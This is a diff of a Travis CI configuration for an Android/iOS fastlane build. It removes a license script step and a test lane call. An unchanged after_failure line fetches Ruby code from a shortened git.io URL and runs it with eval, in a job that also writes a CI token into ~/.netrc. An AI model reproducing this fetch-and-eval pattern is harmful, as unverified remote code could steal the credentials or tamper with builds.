@@ -46,8 +46,6 @@ matrix:
           - add-on
           - extra
       before_install:
-        - chmod +x ./fastlane/scripts/dl_sdk_license.sh
-        - './fastlane/scripts/dl_sdk_license.sh'
         - echo -e "machine github.com\n  login $CI_USER_TOKEN" >> ~/.netrc
         - rvm install 2.5.3
         - rvm use --default 2.5.3
@@ -69,13 +67,11 @@ matrix:
         - travis_retry bundle install
       script:
         - bundle exec fastlane travis
-        - bundle exec fastlane fasttest
         - bundle exec fastlane android stage badge:true clean:false install:false release:false
           simulator:false
       after_failure:
         - bundle exec fastlane fasttest
         - ruby -ropen-uri -e 'eval open("https://git.io/vQhWq").read'
-        - cat ~/.bashrc | egrep "/home/travis/.yarn"
     - language: objective-c
       os: osx
       osx_image: xcode10.1
